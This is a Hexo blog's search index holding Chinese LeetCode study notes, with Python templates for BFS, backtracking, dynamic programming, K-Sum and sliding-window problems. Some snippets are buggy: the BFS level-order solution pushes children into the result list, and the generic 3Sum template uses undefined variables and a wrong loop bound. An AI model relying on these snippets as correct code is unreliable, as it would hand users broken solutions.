<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello World</title>
    <url>/2024/03/07/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2><span id="quick-start">Quick Start</span></h2><h3><span id="create-a-new-post">Create a new post</span></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3><span id="run-server">Run server</span></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3><span id="generate-static-files">Generate static files</span></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3><span id="deploy-to-remote-sites">Deploy to remote sites</span></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>BFS解题模板</title>
    <url>/2024/03/20/leetcode-bfs/</url>
    <content><![CDATA[<h1><span id="bfs">BFS</span></h1><p><strong>核心思路</strong></p>
<ul>
<li>维护一个队列，队列里存放的是同一行的所有节点。</li>
<li>通过while循环每次把队列里的结点全部读掉，并且每读（pop）一个，就要将该结点的左右子结点存放进去</li>
<li>循环直到队列为空</li>
</ul>
<h2><span id="102-二叉树的层序遍历"></span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">levelOrder</span>(<span class="params">self, root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        res = []</span><br><span class="line">        queue = [root]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> queue:</span><br><span class="line">            <span class="comment">## 通过队列长度来遍历掉当前层的所有结点</span></span><br><span class="line">            n = <span class="built_in">len</span>(queue)</span><br><span class="line">            level = []</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">	            node = queue.pop(<span class="number">0</span>)</span><br><span class="line">                level.append(node.val)</span><br><span class="line">                <span class="keyword">if</span> node.left: level.append(node.left)</span><br><span class="line">                <span class="keyword">if</span> node.right: level.append(node.right)</span><br><span class="line">            res.append(level)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">            </span><br></pre></td></tr></table></figure>



<h2><span id="199-二叉树的右视图"></span></h2><p>跟上面的唯一不同就是每层只取最右边的值作为结果返回</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">rightSideView</span>(<span class="params">self, root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        res = []</span><br><span class="line">        queue = [root]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> queue:</span><br><span class="line">            n = <span class="built_in">len</span>(queue)</span><br><span class="line">            level = []</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">                node = queue.pop(<span class="number">0</span>)</span><br><span class="line">                level.append(node.val)</span><br><span class="line">                <span class="keyword">if</span> node.left: queue.append(node.left)</span><br><span class="line">                <span class="keyword">if</span> node.right: queue.append(node.right)</span><br><span class="line">            res.append(level[-<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Leetcode算法笔记</category>
      </categories>
      <tags>
        <tag>Leetcode算法笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>回溯类问题（DFS）解题模板</title>
    <url>/2024/03/14/leetcode-backtrace/</url>
    <content><![CDATA[<h1><span id="回溯类问题-dfs">回溯类问题-DFS</span></h1><p>每次刷题刷完了不久就会忘记DFS的很多细节。。直到看到了东哥的<a href="https://mp.weixin.qq.com/s/nMUHqvwzG2LmWA9jMIHwQQ">回溯算法详解</a>，才从根上理解了这一类算法的底层原理。</p>
<p>对于我这种看到算法就头疼的选手，还真得靠这种大佬帮忙梳理总结底层原理才行。。</p>
<p><strong>核心框架 &amp;&amp; 解题模板</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 定义：</span></span><br><span class="line"><span class="comment">#1、路径：当前已经做过的所有选择</span></span><br><span class="line"><span class="comment">#2、选择列表：当前结点可以做的选择</span></span><br><span class="line"><span class="comment">#3、结束条件：即到达决策树底层，无法再做选择的条件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 核心框架</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backtrace</span>(<span class="params">路径，选择列表</span>)：</span><br><span class="line">	<span class="keyword">if</span> 满足结束条件：</span><br><span class="line">    	<span class="keyword">return</span></span><br><span class="line">    <span class="keyword">for</span> 选择 <span class="keyword">in</span> 选择列表：</span><br><span class="line">        <span class="comment">#做选择</span></span><br><span class="line">        backtrace()</span><br><span class="line">        <span class="comment">#撤销选择</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> 选择 <span class="keyword">in</span> 选择列表：</span><br><span class="line">	<span class="comment"># 做选择</span></span><br><span class="line">    选择列表.remove(当前选择)</span><br><span class="line">    路径.add(当前选择)</span><br><span class="line">    <span class="comment"># 回溯</span></span><br><span class="line">    backtrace(路径，选择列表)</span><br><span class="line">    <span class="comment"># 撤销选择</span></span><br><span class="line">    路径.remove(当前选择)</span><br><span class="line">    选择列表.add(当前选择)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2><span id="49-子集"></span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输入：nums = [1,2,3]</span></span><br><span class="line"><span class="comment"># 输出：[[],[1],[2],[1,2],[3],[1,3],[2,3],[1,2,3]]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 按照回溯的思想，有前序和后序两种方式</span></span><br><span class="line"><span class="comment">## 1、如果是前序执行，则路径的记录顺序应该为:</span></span><br><span class="line"><span class="comment">## [],[1],[1,2],[1,2,3],(从这里开始回撤)[1,3],(再次回撤)[2],[2,3],(再次回撤)[3]</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">subsets</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        res = [] <span class="comment"># 记录最终结果</span></span><br><span class="line">        track = [] <span class="comment"># 维护当前路径</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">backtrace</span>(<span class="params">nums, start</span>):</span><br><span class="line">            res.append(track[:]) <span class="comment"># 把当前路径记录到最终结果里</span></span><br><span class="line">            <span class="comment">## 模板</span></span><br><span class="line">            <span class="comment">## 注意，这里的nums就是我们可以做出选择的选择列表;</span></span><br><span class="line">            <span class="comment">## 且这里的隐藏结束条件是for循环到头</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, <span class="built_in">len</span>(nums)): </span><br><span class="line">                <span class="comment">## 做选择</span></span><br><span class="line">                track.append(nums[i])</span><br><span class="line">                <span class="comment">## 回溯</span></span><br><span class="line">                backtrace(nums, i+<span class="number">1</span>)</span><br><span class="line">                <span class="comment">## 回撤</span></span><br><span class="line">                track.pop()</span><br><span class="line">        backtrace(nums, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    </span><br><span class="line"><span class="comment">## 2、也可以后序执行，则路径的记录顺序为：</span></span><br><span class="line"><span class="comment">## [1,2,3],[1,2],(这里开始有个回撤)[1,3],(再次回撤)[1],(再次回撤)[2,3],(再次回撤)[2],(再次回撤)[3],(自己补一个)[]</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">subsets</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        res = [] <span class="comment"># 记录最终结果</span></span><br><span class="line">        track = [] <span class="comment"># 维护当前路径</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">backtrace</span>(<span class="params">nums, start</span>):</span><br><span class="line">            <span class="comment">## 模板</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, <span class="built_in">len</span>(nums)):</span><br><span class="line">                <span class="comment">## 做选择</span></span><br><span class="line">                track.append(nums[i])</span><br><span class="line">                <span class="comment">## 回溯</span></span><br><span class="line">                backtrace(nums, i+<span class="number">1</span>)</span><br><span class="line">                <span class="comment">## 撤回选择</span></span><br><span class="line">                track.pop()</span><br><span class="line">            res.append(track[:])</span><br><span class="line">        backtrace(nums, <span class="number">0</span>)</span><br><span class="line">        res.append([])</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2><span id="46-全排列"></span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输入：nums = [1,2,3]</span></span><br><span class="line"><span class="comment"># 输出：[[1,2,3],[1,3,2],[2,1,3],[2,3,1],[3,1,2],[3,2,1]]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">permute</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        res = []</span><br><span class="line">        track = []</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">backtrace</span>(<span class="params">nums</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(track) == <span class="built_in">len</span>(nums):</span><br><span class="line">                res.append(track[:])</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)):</span><br><span class="line">                <span class="keyword">if</span> nums[i] <span class="keyword">in</span> track: <span class="keyword">continue</span></span><br><span class="line">                <span class="comment">## 做选择</span></span><br><span class="line">                track.append(nums[i])</span><br><span class="line">                <span class="comment">## 回溯</span></span><br><span class="line">                backtrace(nums)</span><br><span class="line">                <span class="comment">## 撤销选择</span></span><br><span class="line">                track.pop()</span><br><span class="line">                </span><br><span class="line">        backtrace(nums)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2><span id="226-翻转二叉树"></span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输入：root = [4,2,7,1,3,6,9]</span></span><br><span class="line"><span class="comment"># 输出：[4,7,2,9,6,3,1]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">invertTree</span>(<span class="params">self, root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; <span class="type">Optional</span>[TreeNode]:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">root</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            root.left, root.right = root.right, root.left</span><br><span class="line">            dfs(root.left)</span><br><span class="line">            dfs(root.right)</span><br><span class="line">        dfs(root)</span><br><span class="line">        <span class="keyword">return</span> root</span><br></pre></td></tr></table></figure>



<h2><span id="543-二叉树的直径"></span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输入：root = [1,2,3,4,5]</span></span><br><span class="line"><span class="comment"># 输出：3</span></span><br><span class="line"><span class="comment"># 解释：3 ，取路径 [4,2,1,3] 或 [5,2,1,3] 的长度</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">diameterOfBinaryTree</span>(<span class="params">self, root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        self.d = <span class="number">0</span>  <span class="comment"># 记录最终结果</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">root</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            left = dfs(root.left)</span><br><span class="line">            right = dfs(root.right)</span><br><span class="line">            self.d = <span class="built_in">max</span>(self.d, left + right)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">max</span>(left, right) + <span class="number">1</span>   <span class="comment"># 要维护的是当前结点的最长子路径，回撤操作+1</span></span><br><span class="line">        dfs(root)</span><br><span class="line">        <span class="keyword">return</span> self.d</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Leetcode算法笔记</category>
      </categories>
      <tags>
        <tag>Leetcode算法笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>动态规划解题模板</title>
    <url>/2024/03/20/leetcode-dp/</url>
    <content><![CDATA[<h2><span id="动态规划">动态规划</span></h2><p><strong>核心思路</strong></p>
<ul>
<li>确定状态，即问题的变量</li>
<li>确定dp方程</li>
<li>采用自底向上 &#x2F; 自顶向下的解法</li>
</ul>
<p><strong>自底向上</strong></p>
<ul>
<li>从dp(0)开始举几个例子即可</li>
<li>确定好base case，假设base case确定到dp(n)，那么for循环的变量一定要从n+1的情况开始</li>
<li>例：for循环的变量从2开始，那么一定要确定的base case是dp(0), dp(1)</li>
</ul>
<h2><span id="322-零钱兑换"></span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">coinChange</span>(<span class="params">self, coins: <span class="type">List</span>[<span class="built_in">int</span>], amount: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="comment">## dp(n) = min&#123;d(n-coin)&#125; + 1, coin=1,2,5, n &gt; 0</span></span><br><span class="line">        <span class="comment">## dp(0) == 0</span></span><br><span class="line">        <span class="comment">## dp(1) == min&#123;dp(1-1), dp(1-2), dp(1-5)&#125; + 1 == dp(1-1) + 1 == 1</span></span><br><span class="line">        <span class="comment">## dp(2) == min&#123;dp(2-1), dp(2-2), dp(2-5)&#125; + 1 == dp(2-2) + 1 == 1</span></span><br><span class="line">        <span class="comment">## dp(3) == min&#123;dp(3-1), dp(3-2), dp(3-5)&#125; + 1 == dp(2) + 1 == 2</span></span><br><span class="line">        <span class="comment">## dp(4) == min&#123;dp(4-1), dp(4-2), dp(4-5)&#125; + 1 == dp(2) + 1 == 2</span></span><br><span class="line">        dp = [<span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)] * (amount + <span class="number">1</span>)</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> coin <span class="keyword">in</span> coins:</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(coin, amount + <span class="number">1</span>):</span><br><span class="line">                dp[x] = <span class="built_in">min</span>(dp[x], dp[x - coin] + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> dp[amount] <span class="keyword">if</span> dp[amount] != <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>) <span class="keyword">else</span> -<span class="number">1</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Leetcode算法笔记</category>
      </categories>
      <tags>
        <tag>Leetcode算法笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>K-Sum类问题解题模板</title>
    <url>/2024/03/13/leetcode-ksum/</url>
    <content><![CDATA[<h1><span id="k-sum">K-Sum</span></h1><p>K-Sum类问题是指给你一个数组，让你从中挑选出K个数字满足和为N。</p>
<p>K-Sum类的核心思想是 2Sum，然后套娃就行了。因此此类问题的关键点在于<strong>2Sum</strong>的实现。</p>
<p><strong>核心思路</strong>：</p>
<p>​	1、<strong>数组排序</strong></p>
<p>​	2、<strong>双指针</strong>：头尾相向移动，遇到相同的数字跳过****</p>
<p>​	3、<strong>防止重复值</strong>：每个最外层的遍历都需要防止重复值，以及对于遍历数组的边界值的处理</p>
<p><strong>套路模板：</strong></p>
<p>实现(K-1)-Sum，以3Sum为例，首先要实现2Sum：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 2-Sum可直接默写</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">twoSum</span>(<span class="params">nums, start, target</span>):</span><br><span class="line">    res = []</span><br><span class="line">    low, high = start, <span class="built_in">len</span>(nums)-<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        sum_ = nums[low] + nums[high]</span><br><span class="line">        <span class="keyword">if</span> sum_ &lt; target:</span><br><span class="line">            low += <span class="number">1</span></span><br><span class="line">            <span class="comment"># 指针一定要注意，因为前面已经low += 1了</span></span><br><span class="line">            <span class="comment"># 所以现在的nums[low]一定要和nums[low-1]去比较</span></span><br><span class="line">            <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[low] == nums[low-<span class="number">1</span>]: low += <span class="number">1</span> </span><br><span class="line">        <span class="keyword">elif</span> sum_ &gt; target:</span><br><span class="line">            high -= <span class="number">1</span></span><br><span class="line">            <span class="comment"># nums[high]同理</span></span><br><span class="line">            <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[high] == nums[high+<span class="number">1</span>]: high -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res.append([nums[low], nums[high]])</span><br><span class="line">            low += <span class="number">1</span></span><br><span class="line">            high -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[low] == nums[low-<span class="number">1</span>]: low += <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[high] == nums[high+<span class="number">1</span>]: high -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3-Sum 主要是要注意边界值的问题 和 要防止有重复值</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">threeSum</span>(<span class="params">nums, target</span>):</span><br><span class="line">    nums.sort()</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nums[i]-<span class="number">2</span>): <span class="comment">## 注意边界值为K-1</span></span><br><span class="line">        <span class="keyword">if</span> nums[i] &gt; <span class="number">0</span>: <span class="keyword">break</span> <span class="comment">## 因为是升序排列，可提高效率</span></span><br><span class="line">        <span class="keyword">if</span> low &gt; <span class="number">0</span> <span class="keyword">and</span> nums[low] == nums[low-<span class="number">1</span>]: <span class="keyword">continue</span> <span class="comment">## 防止有重复值</span></span><br><span class="line">        <span class="comment">## 调用2Sum</span></span><br><span class="line">        target_ = target - nums[i]</span><br><span class="line">        tuples = twoSum(nums, i+<span class="number">1</span>, target_)</span><br><span class="line">        <span class="keyword">for</span> tup <span class="keyword">in</span> tuples:</span><br><span class="line">            tup.append(nums[i])</span><br><span class="line">            res.append(tip)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">        </span><br></pre></td></tr></table></figure>



<h2><span id="15-三数之和"></span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">twoSum</span>(<span class="params">self, nums, start, target</span>):</span><br><span class="line">        res = []</span><br><span class="line">        low = start</span><br><span class="line">        high = <span class="built_in">len</span>(nums) - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            sum_ = nums[low] + nums[high]</span><br><span class="line">            <span class="keyword">if</span> sum_ &gt; target:</span><br><span class="line">                high -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[high] == nums[high+<span class="number">1</span>]: high = high -<span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> sum_ &lt; target:</span><br><span class="line">                low += <span class="number">1</span></span><br><span class="line">                <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[low] == nums[low-<span class="number">1</span>]: low += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res.append([nums[low], nums[high]])</span><br><span class="line">                high -= <span class="number">1</span></span><br><span class="line">                low += <span class="number">1</span></span><br><span class="line">                <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[high] == nums[high+<span class="number">1</span>]: high -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[low] == nums[low-<span class="number">1</span>]: low += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">threeSum</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        nums.sort()</span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)-<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">if</span> nums[i] &gt; <span class="number">0</span>: <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> nums[i] == nums[i-<span class="number">1</span>]: <span class="keyword">continue</span></span><br><span class="line">            tuples = self.twoSum(nums, i+<span class="number">1</span>, -nums[i])</span><br><span class="line">            <span class="keyword">for</span> tup <span class="keyword">in</span> tuples:</span><br><span class="line">                tup.append(nums[i])</span><br><span class="line">                res.append(tup)</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>

<h2><span id="1-两数之和"></span></h2><p>这里有个小技巧：<strong>给定一个数组，当我们每次需要移动一个指针，然后遍历扫描该指针后面的数组元素的时候，其实可以用哈希表来降低算法复杂度 —— 仅需要扫一遍即可</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输入：nums = [2,7,11,15], target = 9</span></span><br><span class="line"><span class="comment"># 输出：[0,1]</span></span><br><span class="line"><span class="comment"># 解释：因为 nums[0] + nums[1] == 9 ，返回 [0, 1] </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">twoSum</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], target: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        hashtable = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i, num <span class="keyword">in</span> <span class="built_in">enumerate</span>(nums):</span><br><span class="line">            <span class="keyword">if</span> target - num <span class="keyword">in</span> hashtable:</span><br><span class="line">                <span class="keyword">return</span> [hashtable[target-num], i]</span><br><span class="line">            hashtable[nums[i]] = i <span class="comment"># 每次在最后往哈希表里更新即可</span></span><br><span class="line">        <span class="keyword">return</span> []</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Leetcode算法笔记</category>
      </categories>
      <tags>
        <tag>Leetcode算法笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>滑动窗口解题模板</title>
    <url>/2024/03/12/leetcode-sliding-window/</url>
    <content><![CDATA[<p>因为工作关系，coding不常用到算法，每次面试&#x2F;工作中遇到都要回忆好久。因此特意总结一些常见leetcode算法的解题模板，面试&#x2F;工作中遇到一些类似的问题可以节省很多回忆的时间。</p>
<p><strong>模板并不是所有问题的最优解，对于不同类型的问题，时间&#x2F;空间复杂度都要分别再行思考，往往会有更加精巧的解法。</strong></p>
<h1><span id="滑动窗口">滑动窗口</span></h1><p><strong>核心思路：</strong></p>
<p>​	1、<strong>扩大窗口</strong>：移动右指针，直至达到特定要求（初始最优值）的时候</p>
<p>​	2、<strong>收缩窗口</strong>：记录当前最优值，并移动左指针，直至满足扩大窗口的要求</p>
<p><strong>套路模板</strong>：</p>
<p>​	双重循环：<strong>外层循环移动右指针</strong>，<strong>里层循环移动左指针</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">left, right = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> right <span class="keyword">in</span> <span class="built_in">range</span>(n): <span class="comment">## 扩大窗口，右移右指针</span></span><br><span class="line">    <span class="comment">## 处理一些窗口相关的数据</span></span><br><span class="line">    <span class="keyword">while</span> window needs shirnk: <span class="comment">## 当达到当前最优值时，收缩窗口，右移左指针 </span></span><br><span class="line">    	<span class="comment">## 处理一些窗口相关的数据</span></span><br><span class="line">        keep.remove(s[left])</span><br><span class="line">        left += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">## 一轮结束，开始新一轮扩大窗口</span></span><br><span class="line">    <span class="comment">## 处理一些窗口相关的数据</span></span><br><span class="line">    keep.add(s[right])</span><br><span class="line">    </span><br></pre></td></tr></table></figure>



<h2><span id="3-无重复字符的最长子串"></span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">lengthOfLongestSubstring</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> s:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        keep = <span class="built_in">set</span>()</span><br><span class="line">        left, cur_len, max_len, n = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="built_in">len</span>(s)</span><br><span class="line">        <span class="keyword">for</span> right <span class="keyword">in</span> <span class="built_in">range</span>(n): <span class="comment">## 扩大窗口，右移右指针</span></span><br><span class="line">            cur_len += <span class="number">1</span>	<span class="comment">## 处理一些窗口相关的数据：记录当前字符串长度</span></span><br><span class="line">            <span class="keyword">while</span> s[right] <span class="keyword">in</span> keep: <span class="comment">## 当遇到重复字符时，收缩窗口，右移左指针</span></span><br><span class="line">                <span class="comment">## 处理一些窗口相关的数据：</span></span><br><span class="line">                <span class="comment">## 右移左指针（之前要先删掉窗口里的元素）</span></span><br><span class="line">                <span class="comment">## 当前长度 - 1</span></span><br><span class="line">                keep.remove(s[left]) </span><br><span class="line">                left += <span class="number">1</span></span><br><span class="line">                cur_len -= <span class="number">1</span></span><br><span class="line">            <span class="comment">## 一轮结束，需要维护最大长度值，并且增加窗口元素</span></span><br><span class="line">            max_len = <span class="built_in">max</span>(max_len, cur_len)</span><br><span class="line">            keep.add(s[right])</span><br><span class="line">        <span class="keyword">return</span> max_len</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2><span id="209-长度的最小子数组"></span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">minSubArrayLen</span>(<span class="params">self, target: <span class="built_in">int</span>, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        left, n = <span class="number">0</span>, <span class="built_in">len</span>(nums)</span><br><span class="line">        min_len = n + <span class="number">1</span></span><br><span class="line">        sum_ = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> right <span class="keyword">in</span> <span class="built_in">range</span>(n): <span class="comment">## 扩大窗口，右移右指针</span></span><br><span class="line">            sum_ += nums[right] <span class="comment">## 求窗口的和</span></span><br><span class="line">            <span class="keyword">while</span> sum_ &gt;= target: <span class="comment">## 当和大于等于target时，收缩窗口，右移左指针</span></span><br><span class="line">                min_len = <span class="built_in">min</span>(min_len, right + <span class="number">1</span> - left) <span class="comment">## 记录最小的窗口长度</span></span><br><span class="line">                <span class="comment">## 右移左指针，当前长度-1</span></span><br><span class="line">                sum_ -= nums[left] </span><br><span class="line">                left += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> min_len == n + <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> min_len</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
